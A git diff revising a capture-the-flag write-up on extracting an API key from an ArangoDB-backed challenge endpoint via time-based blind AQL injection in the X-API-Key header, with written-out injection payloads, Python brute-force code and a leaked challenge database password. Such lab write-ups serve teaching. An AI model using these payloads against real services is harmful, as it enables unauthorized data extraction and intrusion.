@@ -18,7 +18,7 @@ weight = 4
 
 ### Note
 
-Had to rededownload the artefacts anew due to the timer on the ransomware note page timed out. References to ids and such might differ from here on from time to time. 
+Had to redownload the artefacts due to the timer on the ransomware note page timed out. References to ids and such might differ from here on from time to time. 
 
 ## Solution
 
@@ -34,17 +34,17 @@ For clarity:
 /api/v1/frostbitadmin/bot/<botuuid>/deactivate
 ```
 
-It appears to requiring "authHeader: X-API-Key" set.
-
-Looking at what HTTP verbs the endpoint support I see: 
+It appears to requiring "authHeader: X-API-Key" to b set. The value is yet unknown to me. Further, looking at what HTTP verbs the endpoint support I see: 
 
 ![Supported HTTP verbs](/images/act3/act3-frostbit-deactivate-1.png)
+
+HTTP verbs supported:
 
 * GET
 * HEAD
 * OPTIONS
 
-The tip mentions that the infratructure may reveal something about itself, let's try the debug trick from earlier objectives: 
+The tip mentions that the infratructure may reveal something about itself, let's try the debug trick from earlier objectives and insert some "'" chars in X-Api-Field to trigger errors: 
 
 ![Debug mode](/images/act3/act3-frostbit-deactivate-2.png)
 
@@ -54,7 +54,7 @@ For clarity, here's the output:
 {"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
 ```
 
-This query language looks like ArangoDB, and ChatGPT think that as well. There's a mention of "user_supplied_x_api_key". Let's see if I can trigger something by manipulating it: 
+This query language looks like ArangoDB, and ChatGPT think that as well. There's a mention of "user_supplied_x_api_key". Let's see if I can trigger something by manipulating it (sending 1234 as value for the X-Api-Key): 
 
 ![Debug mode](/images/act3/act3-frostbit-deactivate-3.png)
 
@@ -77,7 +77,7 @@ Yields this error:
 
 ### Overview of keywords allowed or blocked 
 
-It appears that certain keywords are blocked, trying to map them out ( according to https://docs.arangodb.com/stable/aql/fundamentals/syntax/ ):
+It appears that certain keywords are blocked, trying to map them out based on this resource: https://docs.arangodb.com/stable/aql/fundamentals/syntax/:
 
 | Keyword               | Description                                                                 |
 | --------------------- | --------------------------------------------------------------------------- |
@@ -184,23 +184,34 @@ We now know the password for this database server:
 ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodb
 ```
 
-
-
-
-
-
-Solution, created a Jupyter Notebook to work in. 
-
-
-
-
-
-
-
+Unsure if this artefact is even needed, however I do know as a fact we are dealing with ArangoDB. Thinking back to the hints, it appears I have to some blind injection attack combined with some heavy timetaking. How do I proceed? Solution, created a Jupyter Notebook to work in. 
 
 #### Jupyter Notebook
 
+The reasons for choosing to work in Jupyter are:
+
+* I can segment my code into cells and run each one whenever I see fit.
+* Once a cell is run, the output is immediately displayed in the GUI, so I don’t have to take separate notes.
+* I can modify the functionality and simply rerun the cell and the subsequent ones.
+* I tend to solve everything using Python and Jupyter.
+
+Before this, I developed the following hypothesis and methodology to solve this assignment:
+
+1. Identify the redacted API key name by analyzing the letters used in all the document field names.
+2. Bruteforce the document field names using the characters extracted from step 1, thus identifying the API key name.
+3. Bruteforce the values associated with the identified API key field name.
+
+Alongside this I spun up an ArangoDB instance to test various payloads. 
+
 ##### Part one - identifying letters used in fieldnames in ArangoDB documents
+
+Using the ArangoDB instance I had spun up, I created the following payload to identify which letters are used in the fieldnames:
+
+```
+' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0
+```
+
+Where ```{needle}``` is the character we are looking for (using Python format strings). Wrote a Python short using requests to deliver the payload:
 
 ```python
 import requests
@@ -233,13 +244,21 @@ found_letters
 
 Outputs: 
 
-```json
+```
 ['a', 'c', 'd', 'e', 'i', 'k', 'p', 'r', 't', 'v', 'y', '_', '|']
 ```
 
+Nice! I now knew which letters I should look for, greatly reducing the number of HTTP requests needed.
+
 ##### Part two - identify fieldnames
 
-Having the characters used in the fieldnames, I could simply bruteforce my way to find which names was in use: 
+Having the characters used in the fieldnames, I could simply bruteforce my way to find which names was in use by using a slightly different payload: 
+
+```
+' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '{needle}') OR sleep(5) OR '1'=='0
+```
+
+The code: 
 
 ```python
 def identify_keys(needle):
@@ -281,7 +300,7 @@ print(iterate_keys_reverse("activate_api_key|_rev|_key|_id", found_letters)) # =
 
 I had to run this cell two times, one for forward direction identification - and one for iterating my way backwards. Sure, I could have written a cleaner code. Output:
 
-```json
+```
 ...
 ' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), 'ydeactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0
 ' OR CONTAINS(CONCAT_SEPARATOR('|', ATTRIBUTES(doc)), '_deactivate_api_key|_rev|_key|_id') OR sleep(5) OR '1'=='0
@@ -291,7 +310,13 @@ deactivate_api_key|_rev|_key|_id
 
 ##### Part three - finding the API key
 
-The fieldname we are looking for is ```deactivate_api_key```. Using this, I could start finding the API key: 
+The fieldname we are looking for is ```deactivate_api_key```. Using this, I could start finding the API key. I modified the payload to: 
+
+```
+' OR CONTAINS(doc.deactivate_api_key, '{needle}') OR sleep(5) OR '1'=='0
+```
+
+Here's the Python code:
 
 ```python
 def identify_apichar(needle):
@@ -326,7 +351,7 @@ find_api("", characters)
 
 Output (this took a way looooong time to do):
 
-```json
+```
 ...
 ' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f9Z') OR sleep(5) OR '1'=='0
 ' OR CONTAINS(doc.deactivate_api_key, 'abe7a6ad-715e-4e6a-901b-c9279a964f90') OR sleep(5) OR '1'=='0
@@ -334,7 +359,7 @@ Output (this took a way looooong time to do):
 abe7a6ad-715e-4e6a-901b-c9279a964f91
 ```
 
-Answer: ```abe7a6ad-715e-4e6a-901b-c9279a964f91```
+**Answer:** ```abe7a6ad-715e-4e6a-901b-c9279a964f91```
 
 ##### Part four - deactivate
 
@@ -360,4 +385,4 @@ Strict-Transport-Security: max-age=31536000
 {"message":"Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"15d977db-9fa9-48f8-be38-d36c2e21b12d\",\"hash\":\"f215785933f3a1ee0245a653781b94c1bc33c0340301355592492d9b8a2e9b30\",\"uid\":\"82237\"}\nPOSTED WIN RESULTS FOR RID 15d977db-9fa9-48f8-be38-d36c2e21b12d","status":"Deactivated"}
 ```
 
-The API key to deactivate is: ```abe7a6ad-715e-4e6a-901b-c9279a964f91```
+To clarify, the API key to deactivate is: ```abe7a6ad-715e-4e6a-901b-c9279a964f91```
